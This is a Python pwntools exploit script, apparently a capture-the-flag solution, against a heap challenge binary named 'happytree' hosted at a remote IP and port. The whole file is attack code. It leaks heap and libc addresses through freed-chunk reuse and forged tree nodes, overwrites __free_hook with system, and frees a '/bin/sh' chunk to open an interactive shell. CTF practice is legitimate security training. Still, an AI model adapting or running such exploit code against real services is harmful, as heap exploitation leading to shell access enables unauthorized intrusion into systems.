# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './happytree'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '124.71.147.225'
    port = '9999'
    
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(data , text = 'a'):
    cmd(1)
    sla('data:' , data)
    sa('content:' , text)

def show( data ):
    cmd(3)
    sla('data:' , data)

def delete( data ):
    cmd(2)
    sla('data:' , data)

# one_gad = one_gadget(libc.path)
# list = $rebase(0x00000000002022A0)

def attack():
    
    add(0x90 )
    add(0x91 )
    
    delete(0x91)
    delete(0x90)

    add(0x90 , '\x20')

    show(0x90)
    ru('content: ')

    heap_addr = uu64(6) - 0xc0
    heap_base = heap_addr - 0x11e60

    delete(0x90)

    fake_node = flat(
        0x28 , heap_base + 0x10,
        heap_addr + 0x40 , heap_addr + 0x40
    )

    add(0x28 , fake_node)
    delete(0x28)

    fake_node = flat(
        0x28 , heap_addr + 0x40
    )

    add(0x91 , fake_node)
    add(0x90 )

    delete(0x90)

    add(0x90 , '\xa0')
    add(0x92 , '\xa0')
    add(0x93 , '\xa0')

    delete(0x91)
    add(0x38 , '\xa0')
    show(0x38)

    __malloc_hook = l64() - 352 - 0x10
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    delete(0x38)
    add(0x94 , p64(__free_hook - 0x8))
    add(0x30 )
    add(0x38 , flat('/bin/sh\x00' , system_addr))

    # dbg()
    delete(0x38)

    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   happytree.py
@Time    :   2022/02/26 16:12:36
@Author  :   Niyah 
'''